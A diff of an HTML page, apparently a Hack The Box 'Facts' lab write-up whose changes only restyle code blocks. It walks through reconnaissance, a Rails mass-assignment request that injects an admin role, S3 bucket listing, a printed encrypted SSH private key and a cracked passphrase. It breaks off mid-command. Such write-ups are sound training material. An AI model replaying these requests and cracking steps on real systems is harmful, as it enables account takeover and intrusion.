@@ -1012,22 +1012,22 @@
     
 </h4>
 <p>MinIO running on 54321, Nginx on 80, SSH on 22.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="gp">$</span> nmap 10.129.23.220 -p- -A --min-rate <span class="m">5000</span>
-</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="go">PORT      STATE SERVICE VERSION
-</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="go">22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
-</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="go">80/tcp    open  http    nginx 1.26.3 (Ubuntu)
-</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="go">|_http-server-header: nginx/1.26.3 (Ubuntu)
-</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="go">|_http-title: Did not follow redirect to http://facts.htb/
-</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="go">54321/tcp open  http    Golang net/http server
-</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="go">|_http-title: Did not follow redirect to http://10.129.23.220:9001
-</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="go">|_http-server-header: MinIO
-</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="go">| ...[snip]...
-</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="go">|     &lt;Error&gt;&lt;Code&gt;InvalidRequest&lt;/Code&gt;&lt;Message&gt;Invalid Request (invalid argument)&lt;/Message&gt;&lt;Resource&gt;/nice ports,/Trinity.txt.bak&lt;/Resource&gt;&lt;RequestId&gt;18901AD8038ADDBE&lt;/RequestId&gt;&lt;HostId&gt;dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8&lt;/HostId&gt;&lt;/Error&gt;
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>$ nmap 10.129.23.220 -p- -A --min-rate <span style="color:#ae81ff">5000</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>PORT      STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>80/tcp    open  http    nginx 1.26.3 (Ubuntu)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>|_http-server-header: nginx/1.26.3 (Ubuntu)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>|_http-title: Did not follow redirect to http://facts.htb/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>54321/tcp open  http    Golang net/http server
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>|_http-title: Did not follow redirect to http://10.129.23.220:9001
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>|_http-server-header: MinIO
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>| ...[snip]...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>|     &lt;Error&gt;&lt;Code&gt;InvalidRequest&lt;/Code&gt;&lt;Message&gt;Invalid Request (invalid argument)&lt;/Message&gt;&lt;Resource&gt;/nice ports,/Trinity.txt.bak&lt;/Resource&gt;&lt;RequestId&gt;18901AD8038ADDBE&lt;/RequestId&gt;&lt;HostId&gt;dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8&lt;/HostId&gt;&lt;/Error&gt;
+</span></span></code></pre></div></div>
 <p>Added entry to hosts file.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="gp">$</span> tail -1 /etc/hosts
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="go">10.129.23.220   facts.htb
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>$ tail -1 /etc/hosts
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>10.129.23.220   facts.htb
+</span></span></code></pre></div></div>
 
 <h4 class="relative group">MinIO
     <div id="minio" class="anchor"></div>
@@ -1039,10 +1039,10 @@
     
 </h4>
 <p>I attempted to access files directly from MinIO:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="gp">$</span> curl -O http://10.129.23.220:54321/facts/Trinity.txt.bak <span class="o">&amp;&amp;</span> cat Trinity.txt.bak                                   
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="go">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
-</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="go">&lt;Error&gt;&lt;Code&gt;AccessDenied&lt;/Code&gt;&lt;Message&gt;Access Denied.&lt;/Message&gt;&lt;Key&gt;Trinity.txt.bak&lt;/Key&gt;&lt;BucketName&gt;facts&lt;/BucketName&gt;&lt;Resource&gt;/facts/Trinity.txt.bak&lt;/Resource&gt;&lt;RequestId&gt;18901CC37DD3D84E&lt;/RequestId&gt;&lt;HostId&gt;dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8&lt;/HostId&gt;&lt;/Error&gt; 
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>$ curl -O http://10.129.23.220:54321/facts/Trinity.txt.bak <span style="color:#f92672">&amp;&amp;</span> cat Trinity.txt.bak                                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>&lt;Error&gt;&lt;Code&gt;AccessDenied&lt;/Code&gt;&lt;Message&gt;Access Denied.&lt;/Message&gt;&lt;Key&gt;Trinity.txt.bak&lt;/Key&gt;&lt;BucketName&gt;facts&lt;/BucketName&gt;&lt;Resource&gt;/facts/Trinity.txt.bak&lt;/Resource&gt;&lt;RequestId&gt;18901CC37DD3D84E&lt;/RequestId&gt;&lt;HostId&gt;dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8&lt;/HostId&gt;&lt;/Error&gt; 
+</span></span></code></pre></div></div>
 <p>Accessing the endpoint revealed a bucket name <code>facts</code> and a file <code>Trinity.txt.bak</code> via error messages, though direct access was denied without credentials.</p>
 
 <h4 class="relative group">Directory
@@ -1055,10 +1055,10 @@
     
 </h4>
 <p>Admin panel discovered at <code>http://facts.htb/admin/login</code>.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="gp">$</span> gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t <span class="m">50</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="go">...[snip]...
-</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="go">/admin.php            (Status: 302) [Size: 0] [--&gt; http://facts.htb/admin/login]
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>$ gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t <span style="color:#ae81ff">50</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>...[snip]...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>/admin.php            (Status: 302) [Size: 0] [--&gt; http://facts.htb/admin/login]
+</span></span></code></pre></div></div>
 <p><figure><img
     class="my-0 rounded-md"
     loading="lazy"
@@ -1107,15 +1107,15 @@
     data-zoom-src="/investigations/htb-facts/image1.png"></figure>
 </p>
 <p>When a user wishes to change his password, the <code>updated_ajax</code> method is called.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">def</span> <span class="nf">updated_ajax</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="vi">@user</span> <span class="o">=</span> <span class="n">current_site</span><span class="o">.</span><span class="n">users</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:user_id</span><span class="o">]</span><span class="p">)</span>
-</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="n">update_session</span> <span class="o">=</span> <span class="n">current_user_is?</span><span class="p">(</span><span class="vi">@user</span><span class="p">)</span>
-</span></span><span class="line"><span class="ln">4</span><span class="cl">
-</span></span><span class="line"><span class="ln">5</span><span class="cl">  <span class="vi">@user</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">params</span><span class="o">.</span><span class="n">require</span><span class="p">(</span><span class="ss">:password</span><span class="p">)</span><span class="o">.</span><span class="n">permit!</span><span class="p">)</span>      <span class="c1"># permit!</span>
-</span></span><span class="line"><span class="ln">6</span><span class="cl">  <span class="n">render</span> <span class="ss">inline</span><span class="p">:</span> <span class="vi">@user</span><span class="o">.</span><span class="n">errors</span><span class="o">.</span><span class="n">full_messages</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="ln">7</span><span class="cl">
-</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="n">update_auth_token_in_cookie</span> <span class="vi">@user</span><span class="o">.</span><span class="n">auth_token</span> <span class="k">if</span> <span class="n">update_session</span> <span class="o">&amp;&amp;</span> <span class="vi">@user</span><span class="o">.</span><span class="n">saved_change_to_password_digest?</span>
-</span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="k">end</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">updated_ajax</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>  @user <span style="color:#f92672">=</span> current_site<span style="color:#f92672">.</span>users<span style="color:#f92672">.</span>find(params<span style="color:#f92672">[</span><span style="color:#e6db74">:user_id</span><span style="color:#f92672">]</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>  update_session <span style="color:#f92672">=</span> current_user_is?(@user)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>  @user<span style="color:#f92672">.</span>update(params<span style="color:#f92672">.</span>require(<span style="color:#e6db74">:password</span>)<span style="color:#f92672">.</span>permit!)      <span style="color:#75715e"># permit!</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>  render <span style="color:#e6db74">inline</span>: @user<span style="color:#f92672">.</span>errors<span style="color:#f92672">.</span>full_messages<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;, &#39;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>  update_auth_token_in_cookie @user<span style="color:#f92672">.</span>auth_token <span style="color:#66d9ef">if</span> update_session <span style="color:#f92672">&amp;&amp;</span> @user<span style="color:#f92672">.</span>saved_change_to_password_digest?
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9</span><span><span style="color:#66d9ef">end</span></span></span></code></pre></div></div>
 <p>The <code>permit!</code> method allows all parameters without filtering, enabling injection of arbitrary attributes like <code>role</code>.
 <figure><img
     class="my-0 rounded-md"
@@ -1131,11 +1131,11 @@
     data-zoom-src="/investigations/htb-facts/image3.png"></figure>
 </p>
 <p>Intercepted the password change request in burpsuite and injected the admin role parameter: <code>&amp;password%5Brole%5D=admin</code> i successfully escalated to Administrator role.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="ln">1</span><span class="cl"><span class="nf">POST</span> <span class="nn">/admin/settings/update_ajax</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">facts.htb</span>
-</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
-</span></span><span class="line"><span class="ln">4</span><span class="cl">
-</span></span><span class="line"><span class="ln">5</span><span class="cl">method=patch&amp;authenticity_token=...&amp;password%5Bpassword%5D=bubka&amp;password%5Bpassword_confirmation%5D=bubka&amp;password%5Brole%5D=admin</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#a6e22e">POST</span> /admin/settings/update_ajax <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">facts.htb</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>method=patch&amp;authenticity_token=...&amp;password%5Bpassword%5D=bubka&amp;password%5Bpassword_confirmation%5D=bubka&amp;password%5Brole%5D=admin</span></span></code></pre></div></div>
 <p><figure><img
     class="my-0 rounded-md"
     loading="lazy"
@@ -1176,39 +1176,39 @@
     data-zoom-src="/investigations/htb-facts/image5.png"></figure>
 </p>
 <p>I configured AWS CLI with the discovered credentials and checked listed available buckets:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="gp">$</span> aws --endpoint-url http://10.129.23.220:54321 s3 ls --profile facts
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="go">2025-09-11 08:06:52 internal
-</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="go">2025-09-11 08:06:52 randomfacts
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>$ aws --endpoint-url http://10.129.23.220:54321 s3 ls --profile facts
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>2025-09-11 08:06:52 internal
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>2025-09-11 08:06:52 randomfacts
+</span></span></code></pre></div></div>
 <p><code>internal</code> bucket contained a user&rsquo;s home directory, including <code>.ssh/</code> folder.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="gp">$</span> aws --endpoint-url http://10.129.23.220:54321 s3 ls s3://internal --profile facts
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="go">                           PRE .bundle/
-</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="go">                           PRE .cache/
-</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="go">                           PRE .ssh/
-</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="go">2026-01-08 13:45:13        220 .console_logout
-</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="go">2026-01-08 13:45:13       3900 .consolerc
-</span></span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="go">2026-01-08 13:47:17         20 .lesshst
-</span></span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="go">2026-01-08 13:47:17        807 .profile
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>$ aws --endpoint-url http://10.129.23.220:54321 s3 ls s3://internal --profile facts
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>                           PRE .bundle/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>                           PRE .cache/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>                           PRE .ssh/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>2026-01-08 13:45:13        220 .console_logout
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>2026-01-08 13:45:13       3900 .consolerc
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>2026-01-08 13:47:17         20 .lesshst
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>2026-01-08 13:47:17        807 .profile
+</span></span></code></pre></div></div>
 <p>Found SSH keys:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="gp">$</span> cat authorized_keys 
-</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="go">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJcPXX7amOBoIuEwZV634c4MhXpNMI6lPPpIElQSoEgG 
-</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="gp">$</span> cat id_ed25519     
-</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="go">-----BEGIN OPENSSH PRIVATE KEY-----
-</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="go">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBb7hiP9q
-</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="go">v6NehImbaqDycxAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIJcPXX7amOBoIuEw
-</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="go">ZV634c4MhXpNMI6lPPpIElQSoEgGAAAAoOUbnZGaJ3tgD7oBU+eMP80aIG77UpJO6hwvNZ
-</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="go">M1tvDC0mNoRSa6ro6niOpPxaBS0D1SAqoHGcuYhZKFNWfYr6rrhNwkiF4R+VyFhxC0TB2e
-</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="go">fCO1e2EEc4MD0d6aHwVG2DJ5OQYshbaYnEzI4/n4KvA/ocGxVbw1nSiwtBrrGoohoepqV+
-</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="go">G6oZ7gknyOhCrO9STNNqq2MCODFgm0IzEDch4=
-</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="go">-----END OPENSSH PRIVATE KEY-----
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>$ cat authorized_keys 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJcPXX7amOBoIuEwZV634c4MhXpNMI6lPPpIElQSoEgG 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>$ cat id_ed25519     
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBb7hiP9q
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>v6NehImbaqDycxAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIJcPXX7amOBoIuEw
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>ZV634c4MhXpNMI6lPPpIElQSoEgGAAAAoOUbnZGaJ3tgD7oBU+eMP80aIG77UpJO6hwvNZ
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>M1tvDC0mNoRSa6ro6niOpPxaBS0D1SAqoHGcuYhZKFNWfYr6rrhNwkiF4R+VyFhxC0TB2e
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>fCO1e2EEc4MD0d6aHwVG2DJ5OQYshbaYnEzI4/n4KvA/ocGxVbw1nSiwtBrrGoohoepqV+
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>G6oZ7gknyOhCrO9STNNqq2MCODFgm0IzEDch4=
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>-----END OPENSSH PRIVATE KEY-----
+</span></span></code></pre></div></div>
 <p>The private key was encrypted. Converted to hash and cracked with John the Ripper.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="gp">$</span> john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt key.hash
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="go">Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
-</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="go">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
-</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="go">dragonballz      (id_ed25519)     
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>$ john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt key.hash
